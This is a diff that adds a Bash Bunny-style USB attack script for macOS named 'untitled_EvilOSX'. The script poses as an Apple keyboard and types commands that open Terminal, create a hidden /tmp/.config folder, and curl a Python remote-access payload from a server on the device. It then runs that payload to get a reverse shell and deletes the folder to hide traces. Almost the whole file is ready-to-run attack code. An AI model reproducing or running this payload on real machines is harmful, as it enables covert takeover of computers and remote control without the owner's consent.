@@ -1,0 +1,76 @@
+#!/bin/bash
+#
+# Title:         untitled_EvilOSX
+# Author:        stekole
+# Version:       1.0
+# Target:        Mac OSX
+# Dependencies:  python 1.7.X on client
+#
+# Description:   Starts a terminal window on a Mac,then creates a bash reverse
+#
+# Colors:
+# | Status     | Color                         | Description                                      |
+# | ---------- | ------------------------------| ------------------------------------------------ |
+# | SETUP      | Magenta solid                 | Setting attack mode, getting the switch position | 
+# | ATTACK     | Yellow single blink           | Running the Script                               | 
+# | FINISH     | Green blink followed by SOLID | Script is finished                               | 
+
+#Magenta solid
+LED SETUP
+
+# Edit this to point to the  NetCat Listener
+#LISTENER_IP="10.0.22.16"
+#LISTENER_PORT="4444"
+GET SWITCH_POSITION
+GET HOST_IP
+
+# How often (in minutes) should this run from the Launch Agent
+FREQUENCY="60"
+
+#----Proceed with Caution------------------------------------------------------
+
+cd /root/udisk/payloads/$SWITCH_POSITION/
+
+ATTACKMODE ECM_ETHERNET HID VID_0X05AC PID_0X021E
+python -m SimpleHTTPServer 80 &
+while ! nc -z localhost 80 ; do sleep 0.2;done
+
+
+# Emulate the Ducky - QUACK!
+QUACK DEFAULT_DELAY 300
+
+# Start the attack - yellow single blink
+LED ATTACK
+
+# Start the Mac Terminal
+QUACK COMMAND SPACE
+QUACK STRING terminal
+QUACK DELAY 2000
+QUACK ENTER
+
+# Give the terminal window a second to pop up
+QUACK DELAY 1000
+
+# Make the hidden dir in the home dir of our user
+QUACK STRING mkdir -p /tmp/.config/ 
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING curl "http://$HOST_IP/EvilOSX.py" \> "/tmp/.config/s"
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+
+# Bash Reverse Shell into a script 's.sh'
+QUACK STRING python "/tmp/.config/s"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING rm -rf "/tmp/.config/"
+QUACK DELAY 500
+
+# Close the Terminal Window
+QUACK COMMAND q
+QUACK ENTER
+
+# Green 1000ms VERYFAST blink followed by SOLID
+LED FINISH
+exit 0
